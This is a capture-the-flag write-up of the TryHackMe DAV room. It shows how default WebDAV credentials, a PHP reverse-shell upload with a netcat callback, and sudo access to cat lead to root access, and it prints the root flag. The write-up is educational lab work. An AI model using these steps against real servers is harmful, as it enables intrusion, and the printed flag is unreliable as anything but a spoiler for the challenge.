# TryHackMe-DAV-Write-Up
A walkthrough of the DAV room on TryHackMe, demonstrating how WebDAV misconfigurations, default credentials, and weak sudo permissions can lead to full system compromise.


---

#  Room Information

| Category | Details |
|----------|----------|
| Room | DAV |
| Platform | TryHackMe |
| Difficulty | Easy |
| Target IP | <target_ip> |

---
#  Penetration Testing Methodology

1. Network Scanning
2. Web Enumeration
3. WebDAV Authentication
4. File Upload Testing
5. Reverse Shell Access
6. Privilege Escalation
7. Root Access
---


#  Step 1: Network Scanning

The first step was to identify open ports and running services on the target.

### Nmap Scan

```bash
sudo nmap -sV -sC -O -oN nmap.txt <target_ip>
```

### Results

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Only one port was open:

- **Port 80 (HTTP)**
- Apache Web Server running on Ubuntu

Since no useful information was available on the homepage, further enumeration was required.

---

#  Step 2: Directory Enumeration

To discover hidden directories and files, I used Gobuster.

```bash
gobuster dir -u http://<target_ip>/ -w common.txt
```

### Findings

```text
/.htaccess     (403)
hta            (Status: 403)
/.htpasswd     (403)
/webdav/       (401)
index.html      (Status: 200) [Size: 11321]
server-status   (Status: 403)
```


Interesting discovery:
- `/webdav/` returned **401 Unauthorized**
- This indicated that authentication was required

---

# Step 3: Accessing the WebDAV Directory

When accessing `/webdav/`, the server responded with:

```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="webdav"
```

This revealed that HTTP Basic Authentication was being used.

---

## Finding Default Credentials

Research into common WebDAV/XAMPP configurations revealed default credentials:

```text
Username: wampp
Password: xampp
```


Using these credentials successfully authenticated to the WebDAV directory.

### Discovering Stored Credentials

While enumerating the WebDAV directory, I discovered a file named `passwd.dav` containing an Apache MD5 password hash for the WebDAV user. Although authentication had already been achieved using default credentials, this file confirmed that password information was being stored within the exposed WebDAV directory.

```text
wampp:$apr1$Wm_____________________1
```



---

#Step 4: Uploading a PHP Reverse Shell

After successfully authenticating to the WebDAV service, I used `cadaver` to interact with the remote directory.

First, I verified that I had access to the `/webdav/` directory and confirmed the presence of the `passwd.dav` file:

```bash
cadaver http://<target_ip>/webdav/
```

```text
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        passwd.dav
```

Since WebDAV allowed file uploads, I uploaded a PHP reverse shell to the web server:

```text
dav:/webdav/> put php-reverse-shell.php
Uploading php-reverse-shell.php to `/webdav/php-reverse-shell.php':
Progress: [=============================>] 100.0% of 5496 bytes succeeded.
```

I then verified that the file had been uploaded successfully:

```text
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        passwd.dav
        php-reverse-shell.php
```

This confirmed that the server was vulnerable to arbitrary file uploads through WebDAV. The uploaded PHP reverse shell could now be executed by visiting it through the web browser, allowing me to gain remote code execution on the target.

---

# Step 5: Gaining Initial Access


### Start a Listener

```bash
nc -lvnp 4444
```

After uploading, browse to:

```text
http://<target_ip>/webdav/php-reverse-shell.php
```

### Shell Received

```bash
connect to [ATTACKER_IP] from [TARGET_IP]
```

I gained a shell as:

```bash
www-data
```

---


#  Step 6: Stabilizing the Shell

The initial shell was not interactive, so it was upgraded.

### Upgrade to TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background the shell:

```bash
Ctrl + Z
```

Fix terminal settings:
```bash
stty raw -echo; fg
```

Now the shell behaved like a normal terminal.

During this process, I located the user flag file, `user.txt`, in the user's home directory and displayed its contents:

```bash
cat user.txt
```

---

#  Step 7: Privilege Escalation

The next step was to check sudo permissions.

```bash
sudo -l
```

### Output

```text
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat

```

The sudo configuration allowed the `www-data` user to execute `/bin/cat` as root without supplying a password. Since `cat` can read arbitrary files, this could be abused to read sensitive files owned by root, including the root flag.
---

#  Step 8: Reading the Root Flag

Since `cat` can read any file when executed as root, the root flag could be accessed directly.

```bash
sudo /bin/cat /root/root.txt
```

### Root Flag

```text
101101ddc16b0cdf65ba0b8a7af7afa5
```

 Root flag access achieved!
---

#  Lessons Learned

This room demonstrates several common security issues:

- Default credentials left unchanged
- Exposed WebDAV service
- Arbitrary file upload capability
- Execution of uploaded PHP files
- Overly permissive sudo configuration
- Violation of the Principle of Least Privilege
---

#  Tools Used

- Nmap
- Gobuster
- Cadaver
- Netcat
- Python PTY

---


**Room Completed Successfully**

